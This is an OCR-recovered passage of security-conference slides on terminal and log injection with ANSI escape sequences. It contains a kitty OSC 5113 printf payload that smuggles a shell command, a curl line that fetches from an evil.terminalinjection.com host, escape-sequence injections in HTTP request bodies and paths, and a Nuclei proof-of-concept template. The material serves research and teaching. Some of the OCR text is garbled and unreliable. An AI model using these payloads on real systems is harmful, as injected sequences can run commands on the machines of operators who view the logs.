## Slide 123

**OSC5113 - KITTY FILETRANSFER OVER TTY**

\```
printf '\033]5113;ac=send;id=\nopen -a calculator.app\n\033\\'
\```


> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OSCS5113 - KITTY
FILETRANSFER OVER TTY
\nopen -a calculator.app\n
00 File transfer over the TTY
>_ There are sometimes situations where the TTY is the only convenient pipe between two
connected systems, for example, nested SSH sessions, a serial line, etc. In such scenarios, it is
useful to be able to transfer files over the TTY.
```

## Slide 124

**OSC5113 - KITTY FILETRANSFER OVER TTY**

## Slide 125

**OSC5113 - KITTY FILETRANSFER OVER TTY**


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eee ~/Documents
> Documents printf '\@33]5113;ac=send;id=\nopen -a calculator.app\n\@33\\'
> Documents 5113;ac=status; id=
zsh: command not found: 5113
> Documents open —-a calculator.app
> Documents ; -iByZWZ1c2VkIHROZSBO@cmFuc2Zlcg==
```

## Slide 126

######

######

###### **TERMINALS**

###### **APPS/WEBAPPS**

## Slide 127

**\\SANITIZE \\OUTPUT**

## Slide 128

**TERMINALINJECTION.COM**


> Recovered by OCR — confidence 74/100 on the text kept, 42/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
TERMINALINJECTION.COM
14 lecccelececceccc: , dWMMMMWOOKo Ladx@@0 L@MMMMMKdkO LdKMMMO LKNOxxoo00CcCd@XXWMMMMK: ,c: :
23 @x:cOXXXXKOL;,. » ;OKKKKOCKNNNNNNNNXXXKOGN@dOXXXXXXXXXXXXXXXXXXXXXXKKK kox@@Od
27
28
29
30
x00ocdkkxkx; ; dkkkdoodddddodkxd@N@o;, , , LONNNNNXXXXXXXXXXKkxOKOokOddk@K@kxdx@k0@00
```

## Slide 129

###### **TERMINALINJECTION.COM**

\```
curl -L evil.terminalinjection.com > badlog.log
\```

## Slide 130

**BLACKBOX TESTING**

## Slide 131

**400-500 ERRORS**

## Slide 132

\```
POST /api/somepath HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: x
Content-Type: application/json
Connection: close
\```

\```
{
"somekey":"somevalue"
}
\```

## Slide 133

\```
POST /api/somepath HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: x
Content-Type: application/json
Connection: close
\```

\```
{
"somekey":"somevalue\n\u001b[31mESC-INJECTION-LFUNICODE:\u001b[32mSUCCESSFUL\u001b[0m\u0007\n"
}
\```

###### **APPEND UNICODE**

## Slide 134

\```
HTTP/1.1 500 Internal Server Error
content-type: application/json; charset=utf-8
content-length: x
Date: Tue, 18 Jul 2023 21:23:01 GMT
Connection: close
{
"statusCode":500,
"error":"Internal Server Error",
"message":"query does not support somevalue\n\u001b[31mESC-INJECTION-LFUNICODE:
\u001b[32mSUCCESSFUL\u001b[0m\u0007\n"
}
\```

###### **PLAUSIBLE (MOST LIKELY)**

## Slide 135

`HTTP/1.1 500 Internal Server Error content-type: application/json; charset=utf-8 content-length: x Date: Tue, 18 Jul 2023 21:23:01 GMT Connection: close { "statusCode":500, "error":"Internal Server Error", "message":"query does not support somevalue\\n\\u001b[31mESC-INJECTION-LFUNICODE: \\u001b[32mSUCCESSFUL\\u001b[0m\\u0007\\n" }` **ESCAPED PROPERLY (GOOD JOB!)**

## Slide 136

\```
POST /api/somepath HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: x
Content-Type: application/json
Connection: close
\```

`{ "somekey":"somevalue[32mESC-INJECTION-RAW:[31mSUCCESSFUL[0m" }` **APPEND ESC/BELL (0X1B/0X07)**

## Slide 137

\```
POST /api/somepath HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: x
Content-Type: application/json
Connection: close
\```

\```
{
"somekey":"somevalue[32mESC-INJECTION-RAW:[31mSUCCESSFUL[0m"
}
\```

## Slide 138

`HTTP/1.1 500 Internal Server Error content-type: application/json; charset=utf-8 content-length: x Date: Tue, 18 Jul 2023 21:23:01 GMT Connection: close { "statusCode":500, "error":"Internal Server Error", "message":"query does not support somevalue\u001b[31mESC-INJECTION-RAW:\u001b [32mSUCCESSFUL\u001b[0m\u0007" }` **AGAIN PLAUSIBLE (MOST LIKELY)**

## Slide 139

**FALSE POSITIVES**

## Slide 140

\```
HTTP/1.1 500 Internal Server Error
content-type: application/json; charset=utf-8
content-length: x
Date: Tue, 18 Jul 2023 21:23:01 GMT
Connection: close
{
"statusCode":500,
"error":"Internal Server Error",
}
\```

###### **STRIPPED ERROR MESSAGE**

## Slide 141

`HTTP/1.1 404 Not Found content-type: application/json; charset=utf-8 content-length: x Date: Tue, 18 Jul 2023 21:23:01 GMT Connection: close <html> <head><title>404 Not Found</title></head> <body> <center><h1>404 Not Found</h1></center> <hr><center>nginx/1.23.3</center> </body> </html>` **NO DATA IN RESPONSE**

## Slide 142

`HTTP/1.1 400 Bad Request content-type: application/json; charset=utf-8 content-length: x Date: Tue, 18 Jul 2023 21:23:01 GMT Connection: close { "statusCode":400, "error":"Bad Request", "message":"Invalid value \"somevalue\n\u001b[31mESC-INJECTION-LFUNICODE: \u001b[32mSUCCESSFUL\u001b[0m\u0007\n\" }` **PLAUSIBLE (MOST LIKELY) BUT WONT BE LOGGED..**

## Slide 143

**SEEMS TO BE EVERYWHERE**

## Slide 144

**+ACCESS TO LOGS**

**https://nuclei.projectdiscovery.io/**


> Recovered by OCR — confidence 90/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
id: Terminal—injection—poc
info:
name: Ansi Escape sequence terminal injection example
author: STOK
severity:
description: Example poc as a part of the presentation at Blackhat and DEF CON
reference:
- terminalinjection. com
tags: loginjection
http:
— method: GET
path:
- '{{BaseURL}}/\u001b [31mESC—INJECTION—UNICODE: \u@01b [32mSUCCESSFUL\u0@1b [@m\U0007 '
matchers-—condition: or
matchers:
- type: word
part: body
words:
1
2
3
4
5
6
7
8
1
2
3
4
5
6
7
8
```

## Slide 145

**RENDERED IN NUCLEI WHEN TESTING**


> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[INF] New templates added in Latest release: 33
[INF] Templates loaded for current scan: 1
[INF] Targets loaded for current scan: 1
[INF] Running httpx on input host
[INF] Found 1 URL from httpx
[INT] [Terminal injection poc] Dumped HTTP request for http://127.0.0.1/1345/%OAESC INJECTION LIURLENCODED: SUCCESSIUL%O7%DA
Host: 127,.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/51,.0.2866.71 Safari,
37.36
Connection: close
Accept: */x*
Accept Language: en
Accept-Encoding: gzip
HTTP/1.1 104 Not Found
Connection: close
Content-Length: 555
Content Type: text/html
Date: Tue, 91 Aug 2023 08:21:42 GMT
Server: nginx/1.23.3
```

## Slide 146

**DONT GO +ACCESS BRRRRRR TO LOGS RRRRRRR https://nuclei.projectdiscovery.io/**

## Slide 147

**+ACCESS TO LOGS**


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
172.17.0.1 - - [01/Aug/2023:07:21:07 +0000] "HEAD /1345 HTTP/1.1" 404 © "-" "Mozilla/5.0 (Windows NT 5.1
) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36" "-"
172.17.0.1 - - [01/Aug/2023:07:21:13 +0000] "HEAD /1345 HTTP/1.1" 404 © "-" "Mozilla/5.0 (Windows NT 10.
©) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/89.0.4389.114 Safari/537.36" "-"
2023/08/01 07:21:13 [error] 23#23: *52 open() "“/usr/share/nginx/html/1345" failed (2: No such file or di
rectory), client: 172.17.0.1, server: localhost, request: “HEAD /1345 HTTP/1.1", host: "127.0.0.1"
2023/08/01 07:25:13 [error] 23#23: *53 open() "/usr/share/nginx/html/1345" failed (2: No such file or di
rectory), client: 172.17.0.1, server: localhost, request: “HEAD /1345 HTTP/1.1", host: "127.0.0.1"
172.17.0.1 - - [01/Aug/2023:07:25:13 +0000] "HEAD /1345 HTTP/1.1" 404 © "-" "Mozilla/5.0 (Windows NT 6.1
) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/41.0.2228.0 Safari/537.36" "-"
2023/08/01 07:25:13 [error] 23#23: *54 open() "“/usr/share/nginx/html/1345/
ESC-INJECTION-LFURLENCODED: SUCCESSFUL
" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /1345/%0a%
1B%5B31mESC-INJECTION-LFURLENCODED: %1B%5B32mSUCCESSFUL%1B%5BOm%07%0a HTTP/1.1", host: "127.0.0.1"
172.17.0.1 - - [01/Aug/2023:07:25:13 +0000] “GET /1345/%0a%1B%5B31mESC-INJECTION-LFURLENCODED: %1B%5B32mS
UCCESSFUL%1B%5BOm%07%O0a HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) ApplewWebK
1t/537.36 (KHTML, Like Gecko) Chrome/37.0.2062.124 Safari/537.36" "-"
2023/08/01 07:25:13 [error] 24#24: *55 open() "/usr/share/nginx/html/1345/\u001b[31mESC-INJECTION-UNICOD
E: \u001b[32mSUCCESSFUL\uUOO01Lb[Om\UuO007" failed (2: No such file or directory), client: 172.17.0.1, server
> localhost, request: "GET /1345/%5Cu001b%5B31mESC-INJECTION-UNICODE : ®5Cu001b%5B32mSUCCESSFUL%5Cu001b%5B
Om%5CuQOO7 HTTP/1.1", host: "127.0.0.1"
172.17.0.1 - - [01/Aug/2023:07:25:13 +0000] "GET /1345/%5Cu001b%5B3 1mESC-INJECTION-UNICODE : %5Cu001b%5B32
mSUCCESSFUL%5CuO01b%5BOm%5CuO007 HTTP/1.1" 404 555 "-" "“Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleW
ebKit/537.36 (KHTML, Like Gecko) Chrome/70.0.3538.77 Safari/537.36" "-"
```

## Slide 148

**YOU NEED ACCESS TO LOGS!**

###### **TO VERIFY THAT IT RENDERED, SERVER RESPONSES ISNT ENOUGH.**

## Slide 149

**WHERE ELSE DOES THIS RENDER? TIME TO BREAK SOME AUTOMATION!**


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GNU nano 6.4 /etc/apache2/conf-enabled/security.conf *
#
# ServerTokens
# This directive configures what you return as the Server HTTP response
# Header. The default is 'Full' which sends information about the OS-Type
# and compiled in modules.
# Set to one of: Full | OS | Minimal | Minor | Major | Prod
# where Full conveys the most information, and Prod the least.
#ServerTokens Minimal
#ServerTokens 0s
ServerTokens Full
#
# Optionally add a line containing the server version and virtual host
# name to server-generated pages (internal error documents, FTP directory
listings, mod_status and mod_info output ete., but not CGI gencrated
documents or custom error documents).
Set to "EMail" to also include a mailto: link to the ServerAdmin.
we) Help we) Write Out aN Where Is a Cut aan Execute wel Location eg Undo
we Exit wr Read File way Replace we) Paste ae) Justify aye GO To Line ena Redo
```

## Slide 150

**@STOKFREDRIK**
